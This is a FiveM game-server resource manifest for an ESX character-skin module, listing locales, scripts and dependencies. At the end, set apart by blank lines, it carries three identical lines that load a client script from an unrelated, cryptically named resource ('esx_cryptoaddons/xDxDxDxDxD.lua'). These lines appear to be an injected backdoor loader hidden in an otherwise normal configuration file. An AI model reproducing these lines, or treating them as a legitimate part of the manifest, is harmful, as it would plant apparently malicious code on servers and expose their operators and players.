--[[ 
	Kronenburg Roleplay
	Copyright © GJSBRT <g@gijs.eu>

	This project is licensed under the terms of the Apache License 2.0 license.
	https://choosealicense.com/licenses/apache-2.0/
]]
 
 
fx_version 'adamant'

game 'gta5'

description 'ESX Skin'

version '1.1.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'locales/es.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/de.lua',
	'locales/br.lua',
	'locales/en.lua',
	'locales/fi.lua',
	'locales/fr.lua',
	'locales/sv.lua',
	'locales/pl.lua',
	'locales/es.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'es_extended',
	'skinchanger'
}




client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'